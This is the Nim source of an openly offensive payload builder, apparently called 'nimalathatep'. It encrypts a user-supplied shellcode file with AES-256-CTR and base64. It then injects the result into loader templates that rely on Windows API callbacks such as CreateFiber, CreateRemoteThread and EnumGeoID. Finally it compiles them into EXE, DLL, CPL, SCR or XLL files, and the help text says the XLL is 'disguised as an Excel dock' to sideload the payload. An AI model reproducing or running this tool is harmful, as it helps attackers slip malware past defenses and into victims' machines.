import winim/lean
import os
import base64
import nimcrypto
import strutils
import random


let banner = """
 ______ __  __  ____      ___ ____   ___  __    __ __    __ __  __   ___       ___ __  __  ___    ___    __ 
 | || | ||  || ||        //   || \\ // \\ ||    || ||    || ||\ ||  // \\     //   ||  || // \\  // \\  (( \
   ||   ||==|| ||==     ((    ||_// ||=|| \\ /\ // ||    || ||\\|| (( ___    ((    ||==|| ||=|| ((   ))  \\ 
   ||   ||  || ||___     \\__ || \\ || ||  \V/\V/  ||__| || || \||  \\_||     \\__ ||  || || ||  \\_//  \_))
                                                                                                            
        
                                                                ,* .,  ,., .                        
                                                           .**((((.        ,(%(//,                  
                                                           ,((((,     */      ,(((/.. .             
               ,/((((*      *(((/,,                         .*/*,              ,**,.                
           ..*(/#(              /(#(*,                          ./,.         ....                   
            .,/*/,              ,((/*,.                                                             
              .(//             .*,..                                                                
                    ..     ..                                                                       
                                                                                                    
                                                                                                    
                                      ,#(((////*//((*,.                       *(#(/*/,**/(/(*,.     
,* .*  **,,,,.                     *//#((/.          /##/(/.               ,*/#(##/         ./#(/(*.
#/.        ,##((*,*              .,/(##(               .(###*,            .*(#(((               /#((
              /###*,,             ..*/**       .        ,/*/*,.             ./*//                ,//
              ,((***,.               *//*               ,/,..                 ,*//,              *.,
             .,***.                      .,*.       ....                           ,,,        ,,... 
           .....                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                      .*.  ,   .. ,,.               
     ./#(#((((/,*/(/((/*,.                                        .*((((##/.      ,(#///,           
  ,*//#/((/           ,(#(///*,                                ..//(/(**             ./#((//*.      
 ,*((#((.                (####/..                              .,/(((#*                 *#((((,,    
 ,*//(/.      .          ,(/(***..                               ,*//(*                  */(*(*,,.  
  ,//,*.                 .***/** .                                .*//*,                 ,**/* .    
   .(//*                 ..,,.                                       ,///               .,...       
      .,,*.          ...,..                                               ,,,.       ., .           
               .                                                                                    
                                                                                                    
  
             ...quivering and afraid, into the sightless vortex of the unimaginable.

         
"""
echo "\n"
echo banner
let helpmenu = """
Usage: nimalathatep.exe <apiMethod> <binFile> <outfiletype>

Methods currently available:
EnumGeoID [enumgeoid]
CreateFiber [createfiber]
CreateRemoteThread [createremotethread]
CreateThreadpoolWait [createhreadpoolwait]
EnumLanguageGroupLocales [enumlanguage]
CryptEnumOIDInfo [cryptenum]
EnumDisplayMonitors [enumdisplay]
CertEnumSystemStore [enumsystemstore]
EnumDesktopWindows [enumdesktop]
EnumTimeFormatsEx [enumtime]
EnumCalendarInfoW [enumcalendar]

File types currently available:
EXE - bread and butter
DLL - use rundll32.exe and give it any function after (ex: rundll32.exe evil.dll foobar123) 
CPL - Control Panel Applet, can just be clicked or run with control.exe or rundll32.exe
SCR - can be run just by clicking, or executing the file in a shell
XLL - disguised as an Excel dock, sideloads payload
"""

let argc = paramCount()
let argv = commandLineParams()

proc printHelp(fail :bool) =
    echo helpmenu
    if fail:
        quit 1
    else:
        quit 0

proc prePayloadGen(file_path: string, encodedCrypted: string, newpassword: string) =
    var file_target = file_path.readFile()
    let placeholder = "REPLACE_ME"
    let replacement =  encodedCrypted
    file_target = file_target.replace(placeholder, replacement)
    file_path.writeFile(file_target)         
    let pass_new = newpassword
    let replace_pass_new = "PASSWORD_ME"
    file_target = file_target.replace(replace_pass_new, pass_new)
    file_path.writeFile(file_target)

proc postPayloadGen(file_path: string, encodedCrypted: string, newpassword: string) =
    var file_target = file_path.readFile()
    let placeholder_new = encodedCrypted
    let replacement_new = "REPLACE_ME"
    file_target = file_target.replace(placeholder_new, replacement_new)
    file_path.writeFile(file_target)
            #you too password!
    let password_revert = newpassword
    let original_pass = "PASSWORD_ME"
    file_target = file_target.replace(password_revert, original_pass)
    file_path.writeFile(file_target)


proc rndStr: string =
    for _ in .. 42:
        add(result, char(rand(int('A') .. int('z'))))


proc main() = 

    if argc == 0:
        echo "No args provided.\nSee usage below:\n"
        printHelp(true)
    elif argc != 3:
        echo "No args provided"
        printHelp(true)

    case argv[0]:
        of "h":
            printHelp(false)
        of "help":
            printHelp(false)
        of "-h":
            printHelp(false)

    let #get args
        apiMethod: string = argv[0]
        binFile: string = argv[1]
        fileType: string = argv[2]

    #read the file
    var file: File
    file = open(binFile, fmRead)
    var fileSize = file.getFileSize()
    var plaintext = newSeq[byte] (fileSize)
    discard file.readBytes(plaintext, 0, fileSize) #ignore the return value
    var
        ectx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        encrypted: seq[byte] = newSeq[byte](len(plaintext))
    iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149] #static still for new 
    randomize()
    var newpassword: string = rndStr()
    var expandedKey = sha256.digest(newpassword)
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

        
    ectx.init(key, iv)
    ectx.encrypt(plaintext, encrypted)
    ectx.clear()
        
    # Base64 encode encrypted shellcode
    let encodedCrypted = encode(encrypted)

    echo "Encrypting and encoding payload. May your efforts be fruitful.\n\n"


    if apiMethod == "enumgeoid":

        if fileType != "xll": 

            let file_path = ".\\apiMethods\\EnumGeoID\\EnumGeoID.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)

            if fileType == "exe":
                discard execShellCmd("nim -d:release --out:EnumGeoID.exe --app:gui c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")
            elif fileType == "dll":
                discard execShellCmd("nim -d:release --out:EnumGeoID.dll --app:lib c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")
            elif fileType == "cpl":
                discard execShellCmd("nim -d:release --out:EnumGeoID.cpl --app:lib c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")
            elif fileType == "scr":
                discard execShellCmd("nim -d:release --out:EnumGeoID.scr --app:gui c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")
            else:
                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
            
            postPayloadGen(file_path, encodedCrypted, newpassword)
        else: 
            echo "\n"

        if fileType == "xll":

            let file_path = ".\\apiMethods\\EnumGeoID\\EnumGeoIDXLL.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)
            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumGeoIDXLL.dll .\\apiMethods\\EnumGeoID\\EnumGeoIDXLL.nim")
            
            discard execShellCmd("move EnumGeoIDXLL.dll EnumGeoID.xll")

            postPayloadGen(file_path, encodedCrypted, newpassword)
        else:
            echo "\n"

    elif apiMethod == "createfiber": 

        if fileType != "xll": 
            let file_path = ".\\apiMethods\\CreateFiber\\CreateFiber.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)


            if fileType == "exe":
                discard execShellCmd("nim -d:release --out:CreateFiber.exe --app:gui c .\\apiMethods\\CreateFiber\\CreateFiber.nim")
            elif fileType == "dll":
                discard execShellCmd("nim -d:release --out:CreateFiber.dll --app:lib c .\\apiMethods\\CreateFiber\\CreateFiber.nim")
            elif fileType == "cpl":
                discard execShellCmd("nim -d:release --out:CreateFiber.cpl --app:lib c .\\apiMethods\\CreateFiber\\CreateFiber.nim")
            elif fileType == "scr":
                discard execShellCmd("nim -d:release --out:CreateFiber.scr --app:gui c .\\apiMethods\\CreateFiber\\CreateFiber.nim")
            else:
                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
            postPayloadGen(file_path, encodedCrypted, newpassword)
        else: 
            echo "\n"

        if fileType == "xll":

            let file_path = ".\\apiMethods\\CreateFiber\\CreateFiberXLL.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)
            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CreateFiberXLL.dll .\\apiMethods\\CreateFiber\\CreateFiberXLL.nim")
            
            discard execShellCmd("move CreateFiberXLL.dll CreateFiber.xll")

            postPayloadGen(file_path, encodedCrypted, newpassword)
        else:
            echo "\n"
     
    elif apiMethod == "createremotethread": 
        if fileType != "xll": 
            let file_path = ".\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)


            if fileType == "exe":
                discard execShellCmd("nim -d:release --out:CreateRemoteThread.exe --app:gui c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")
            elif fileType == "dll":
                discard execShellCmd("nim -d:release --out:CreateRemoteThread.dll --app:lib c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")
            elif fileType == "cpl":
                discard execShellCmd("nim -d:release --out:CreateRemoteThread.cpl --app:lib c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")
            elif fileType == "scr":
                discard execShellCmd("nim -d:release --out:CreateRemoteThread.scr --app:gui c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")
            else:
                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
            postPayloadGen(file_path, encodedCrypted, newpassword)
        else: 
            echo "\n"

        if fileType == "xll":

            let file_path = ".\\apiMethods\\CreateRemoteThread\\CreateRemoteThreadXLL.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)
            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CreateRemoteThreadXLL.dll .\\apiMethods\\CreateRemoteThread\\CreateRemoteThreadXLL.nim")
            
            discard execShellCmd("move CreateRemoteThreadXLL.dll CreateRemoteThread.xll")

            postPayloadGen(file_path, encodedCrypted, newpassword)
        else:
            echo "\n"
       
    elif apiMethod == "createthreadpoolwait": 
        if fileType != "xll": 
            let file_path = ".\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)


            if fileType == "exe":
                discard execShellCmd("nim -d:release --out:CreateThreadpoolWait.exe --app:gui c .\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim")
            elif fileType == "dll":
                echo "DLLs will not execute with this function call due to its nature. I'll try to fix this in the future - S3lrius\n"
                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
            elif fileType == "cpl":
                echo "Control Panel Applets will not execute with this function call due to its nature.\n"
                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
            elif fileType == "scr":
                discard execShellCmd("nim -d:release --out:CreateThreadpoolWait.scr --app:gui c .\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim")
            else:
                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
            postPayloadGen(file_path, encodedCrypted, newpassword)
        else: 
            echo "\n"

        if fileType == "xll":

            let file_path = ".\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWaitXLL.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)
            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CreateThreadpoolWaitXLL.dll .\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWaitXLL.nim")
            
            discard execShellCmd("move CreateThreadpoolWaitXLL.dll CreateThreadpoolWait.xll")

            postPayloadGen(file_path, encodedCrypted, newpassword)
        else:
            echo "\n"
        
    elif apiMethod == "enumlanguage": 
        if fileType != "xll": 
            let file_path = ".\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)


            if fileType == "exe":
                discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.exe --app:gui c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
            elif fileType == "dll":
                discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.dll --app:lib c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
            elif fileType == "cpl":
                discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.cpl --app:lib c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
            elif fileType == "scr":
                discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.scr --app:gui c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
            else:
                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
            postPayloadGen(file_path, encodedCrypted, newpassword)
        else: 
            echo "\n"

        if fileType == "xll":

            let file_path = ".\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocalesXLL.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)
            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumLanguageGroupLocalesXLL.dll .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocalesXLL.nim")
            
            discard execShellCmd("move EnumLanguageGroupLocalesXLL.dll EnumLanguageGroupLocales.xll")

            postPayloadGen(file_path, encodedCrypted, newpassword)
        else:
            echo "\n"
        
    elif apiMethod == "cryptenum": 
        if fileType != "xll": 
            let file_path = ".\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)


            if fileType == "exe":
                discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.exe --app:gui c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
            elif fileType == "dll":
                discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.dll --app:lib c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
            elif fileType == "cpl":
                discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.cpl --app:lib c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
            elif fileType == "scr":
                discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.scr --app:gui c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
            else:
                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
            postPayloadGen(file_path, encodedCrypted, newpassword)
        else: 
            echo "\n"

        if fileType == "xll":
            echo "This function currently isn't working with XLL. I'll fix this soon. -S3lrius"
        else:
            echo "\n"
        
    elif apiMethod == "enumdisplay": 
        if fileType != "xll": 
            let file_path = ".\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)


            if fileType == "exe":
                discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.exe --app:gui c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
            elif fileType == "dll":
                discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.dll --app:lib c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
            elif fileType == "cpl":
                discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.cpl --app:lib c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
            elif fileType == "scr":
                discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.scr --app:gui c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
            else:
                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
            postPayloadGen(file_path, encodedCrypted, newpassword)
        else: 
            echo "\n"

        if fileType == "xll":

            let file_path = ".\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitorsXLL.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)
            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumDisplayMonitorsXLL.dll .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitorsXLL.nim")
            
            discard execShellCmd("move EnumDisplayMonitorsXLL.dll EnumDisplayMonitors.xll")

            postPayloadGen(file_path, encodedCrypted, newpassword)
        else:
            echo "\n"
        
    elif apiMethod == "enumsystemstore": 
        if fileType != "xll": 
            let file_path = ".\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)


            if fileType == "exe":
                discard execShellCmd("nim -d:release --out:CertEnumSystemStore.exe --app:gui c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
            elif fileType == "dll":
                discard execShellCmd("nim -d:release --out:CertEnumSystemStore.dll --app:lib c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
            elif fileType == "cpl":
                discard execShellCmd("nim -d:release --out:CertEnumSystemStore.cpl --app:lib c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
            elif fileType == "scr":
                discard execShellCmd("nim -d:release --out:CertEnumSystemStore.scr --app:gui c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
            else:
                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
            postPayloadGen(file_path, encodedCrypted, newpassword)
        else: 
            echo "\n"

        if fileType == "xll":

            let file_path = ".\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStoreXLL.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)
            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CertEnumSystemStoreXLL.dll .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStoreXLL.nim")
            
            discard execShellCmd("move CertEnumSystemStoreXLL.dll CertEnumSystemStore.xll")

            postPayloadGen(file_path, encodedCrypted, newpassword)
        else:
            echo "\n"
        
    elif apiMethod == "enumdesktop": 
        if fileType != "xll": 
            let file_path = ".\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)


            if fileType == "exe":
                discard execShellCmd("nim -d:release --out:EnumDesktopWindows.exe --app:gui c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
            elif fileType == "dll":
                discard execShellCmd("nim -d:release --out:EnumDesktopWindows.dll --app:lib c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
            elif fileType == "cpl":
                discard execShellCmd("nim -d:release --out:EnumDesktopWindows.cpl --app:lib c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
            elif fileType == "scr":
                discard execShellCmd("nim -d:release --out:EnumDesktopWindows.scr --app:gui c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
            else:
                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
            postPayloadGen(file_path, encodedCrypted, newpassword)
        else: 
            echo "\n"

        if fileType == "xll":

            let file_path = ".\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindowsXLL.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)
            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumDesktopWindowsXLL.dll .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindowsXLL.nim")
            
            discard execShellCmd("move EnumDesktopWindowsXLL.dll EnumDesktopWindows.xll")

            postPayloadGen(file_path, encodedCrypted, newpassword)
        else:
            echo "\n"

    elif apiMethod == "enumtime": 
        if fileType != "xll": 
            let file_path = ".\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)


            if fileType == "exe":
                discard execShellCmd("nim -d:release --out:EnumTimeFormatsEx.exe --app:gui c .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim")
            elif fileType == "dll":
                discard execShellCmd("nim -d:release --out:EnumTimeFormatsEx.dll --app:lib c .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim")
            elif fileType == "cpl":
                discard execShellCmd("nim -d:release --out:EnumTimeFormatsEx.cpl --app:lib c .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim")
            elif fileType == "scr":
                discard execShellCmd("nim -d:release --out:EnumTimeFormatsEx.scr --app:gui c .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim")
            else:
                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
            postPayloadGen(file_path, encodedCrypted, newpassword)
        else: 
            echo "\n"

        if fileType == "xll":

            let file_path = ".\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsExXLL.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)
            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumTimeFormatsExXLL.dll .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsExXLL.nim")
            
            discard execShellCmd("move EnumTimeFormatsExXLL.dll EnumTimeFormatsEx.xll")

            postPayloadGen(file_path, encodedCrypted, newpassword)
        else:
            echo "\n"

    elif apiMethod == "enumcalendar": 
        if fileType != "xll": 
            let file_path = ".\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)


            if fileType == "exe":
                discard execShellCmd("nim -d:release --out:EnumCalendarInfo.exe --app:gui c .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim")
            elif fileType == "dll":
                discard execShellCmd("nim -d:release --out:EnumCalendarInfo.dll --app:lib c .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim")
            elif fileType == "cpl":
                discard execShellCmd("nim -d:release --out:EnumCalendarInfo.cpl --app:lib c .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim")
            elif fileType == "scr":
                discard execShellCmd("nim -d:release --out:EnumCalendarInfo.scr --app:gui c .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim")
            else:
                echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
            postPayloadGen(file_path, encodedCrypted, newpassword)
        else: 
            echo "\n"

        if fileType == "xll":

            let file_path = ".\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfoXLL.nim"
            prePayloadGen(file_path, encodedCrypted, newpassword)
            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumCalendarInfoXLL.dll .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfoXLL.nim")
            
            discard execShellCmd("move EnumCalendarInfoXLL.dll EnumCalendarInfo.xll")

            postPayloadGen(file_path, encodedCrypted, newpassword)
        else:
            echo "\n"
main()